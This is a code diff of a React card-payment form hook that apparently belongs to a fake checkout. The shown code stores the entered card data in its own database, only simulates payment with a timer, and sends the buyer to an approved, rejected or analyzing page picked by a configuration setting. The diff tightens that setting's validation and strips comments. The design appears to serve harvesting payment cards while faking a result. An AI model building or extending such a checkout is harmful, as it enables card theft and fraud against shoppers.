@@ -1,4 +1,3 @@
-
 import { useState, useEffect } from "react";
 import { useNavigate, useParams } from "react-router-dom";
 import { ConfigCheckout } from "@/lib/types/database-types";
@@ -61,7 +60,6 @@ export const useCardPaymentForm = (
     }));
   };
   
-  // Save card data to the database
   const captureCardData = async (cardData: CardFormData) => {
     try {
       console.log("Saving card data to database...");
@@ -101,7 +99,6 @@ export const useCardPaymentForm = (
       installments
     };
     
-    // Log for debugging
     console.log("Processing card payment:", { 
       slug, 
       customRedirectStatus,
@@ -110,32 +107,33 @@ export const useCardPaymentForm = (
     });
     
     try {
-      // First, save the card data to our database
       await captureCardData(cardData);
       
       if (onPaymentSubmit) {
         onPaymentSubmit(cardData);
       } else {
-        // Simulate payment processing
         setTimeout(() => {
           try {
             if (slug) {
-              // Determine redirect status
               let redirectStatus: PaymentStatus;
               
               if (customRedirectStatus) {
                 redirectStatus = customRedirectStatus;
                 console.log("Using custom status:", redirectStatus);
               } else if (configCheckout?.redirect_card_status) {
-                redirectStatus = configCheckout.redirect_card_status as PaymentStatus;
-                console.log("Using global config status:", redirectStatus);
+                const configStatus = configCheckout.redirect_card_status;
+                if (['analyzing', 'approved', 'rejected'].includes(configStatus as string)) {
+                  redirectStatus = configStatus as PaymentStatus;
+                  console.log("Using global config status:", redirectStatus);
+                } else {
+                  redirectStatus = 'analyzing';
+                  console.log("Config status invalid, using default:", redirectStatus);
+                }
               } else {
-                // Fallback default status
                 redirectStatus = 'analyzing';
                 console.log("Using default status:", redirectStatus);
               }
               
-              // Redirect to appropriate page
               console.log(`Redirecting to: /payment-status/${slug}/${redirectStatus}`);
               navigate(`/payment-status/${slug}/${redirectStatus}`);
             } else {
